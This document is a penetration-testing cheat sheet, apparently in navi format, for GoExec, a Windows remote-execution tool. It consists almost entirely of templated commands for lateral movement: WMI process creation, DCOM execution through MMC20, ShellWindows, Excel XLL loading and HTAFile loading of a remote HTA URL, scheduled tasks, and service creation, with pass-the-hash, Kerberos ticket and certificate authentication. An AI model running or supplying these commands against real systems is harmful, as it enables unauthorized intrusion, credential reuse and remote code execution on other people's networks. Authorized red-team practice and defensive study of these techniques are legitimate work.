# GoExec

## GoExec auth

### Password auth

GoExec supports WMI, DCOM, SCMR, and Task Scheduler remote execution from Linux with password, hash, Kerberos, AES, ccache, or certificate authentication.

```sh title:"GoExec password auth base"
goexec $module $method $rhost_name -u "$domain\\$user" -p "$pass" $goexec_exec
```
<!-- cheat
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var domain
var user
var pass
var goexec_exec := -c "$command"
var command
-->

### NT hash auth

Authenticate with an NT hash.

```sh title:"GoExec NT hash auth"
goexec $module $method $rhost_name -u "$domain\\$user" -H "$nt_hash" $goexec_exec
```
<!-- cheat
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var domain
var user
var nt_hash
var goexec_exec := -c "$command"
var command
-->

### Kerberos ccache auth

Use an existing ccache for Kerberos authentication.

```sh title:"GoExec Kerberos ccache auth"
goexec $module $method $rhost_name -u "$user@$domain" -k --ccache "$ccache_file" --dc "$rhost_ip" $goexec_exec
```
<!-- cheat
import domain_ip
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var user
var domain
var ccache_file
var goexec_exec := -c "$command"
var command
-->

### PFX certificate auth

Authenticate with a client certificate and private key in PFX form.

```sh title:"GoExec certificate auth"
goexec $module $method $rhost_name -u "$user@$domain" --pfx "$pfx_file" --pfx-password "$pfx_pass" $goexec_exec
```
<!-- cheat
var module = printf 'wmi\ndcom\nscmr\ntsch\n' --- --header 'GoExec module'
var method
var rhost_name
var user
var domain
var pfx_file
var pfx_pass
var goexec_exec := -c "$command"
var command
-->

## GoExec WMI

### WMI process

Create a remote process through `Win32_Process.Create`.

```sh title:"GoExec WMI process creation"
goexec wmi proc $rhost_name -u "$domain\\$user" -p "$pass" -e "$remote_exe" -a "$remote_args"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var remote_exe
var remote_args
-->

### WMI output

Fetch command output over SMB and print it to stdout.

```sh title:"GoExec WMI command with output"
goexec wmi proc $rhost_name -u "$domain\\$user" -H "$nt_hash" -e cmd.exe -a "/c $command" -o-
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var command
-->

### WMI method call

Call an arbitrary WMI method with JSON arguments.

```sh title:"GoExec arbitrary WMI method call"
goexec wmi call $rhost_name -u "$domain\\$user" -p "$pass" -C "$wmi_class" -m "$wmi_method" -A "$wmi_args_json"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var wmi_class
var wmi_method
var wmi_args_json
-->

## GoExec DCOM

### MMC20

Execute through the `MMC20.Application` DCOM object.

```sh title:"GoExec DCOM MMC20 command"
goexec dcom mmc $rhost_name -u "$domain\\$user" -H "$nt_hash" -e cmd.exe -a "/c $command" -o-
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var command
-->

### ShellWindows

Execute through the ShellWindows DCOM object. This may require an active desktop session.

```sh title:"GoExec DCOM ShellWindows"
goexec dcom shellwindows $rhost_name -u "$domain\\$user" -p "$pass" -e "$remote_exe" -a "$remote_args"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var remote_exe
var remote_args
-->

### HTAFile URL

Load a remote HTA or scriptlet URL through the HTAFile DCOM object.

```sh title:"GoExec DCOM HTAFile URL"
goexec dcom htafile $rhost_name -u "$domain\\$user" -H "$nt_hash" --url "$url"
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var url
-->

### Excel XLL

Load an XLL/DLL through remote Excel DCOM.

```sh title:"GoExec DCOM Excel XLL"
goexec dcom excel xll $rhost_name -u "$domain\\$user" -H "$nt_hash" --xll "$xll_path"
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var xll_path
-->

## GoExec Task Scheduler

### Create task

Register a remote task and start it after a short delay.

```sh title:"GoExec scheduled task create"
goexec tsch create $rhost_name -u "$user@$domain" -H "$nt_hash" --dc "$rhost_ip" -k --task "$task_name" -c "$command"
```
<!-- cheat
import domain_ip
var rhost_name
var user
var domain
var nt_hash
var task_name
var command
-->

### Demand task

Register a task and demand immediate execution.

```sh title:"GoExec scheduled task demand"
goexec tsch demand $rhost_name -u "$domain\\$user" -p "$pass" --task "$task_name" -c "$command" -o-
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var task_name
var command
-->

## GoExec SCMR

### Change service command

Modify an existing service to run a command.

```sh title:"GoExec SCMR change service"
goexec scmr change $rhost_name -u "$domain\\$user" -p "$pass" --service "$service_name" -c "$command"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var service_name
var command
-->

### Create service

Create and start a service for command execution.

```sh title:"GoExec SCMR create service"
goexec scmr create $rhost_name -u "$domain\\$user" -H "$nt_hash" --service "$service_name" -c "$command"
```
<!-- cheat
var rhost_name
var domain
var user
var nt_hash
var service_name
var command
-->
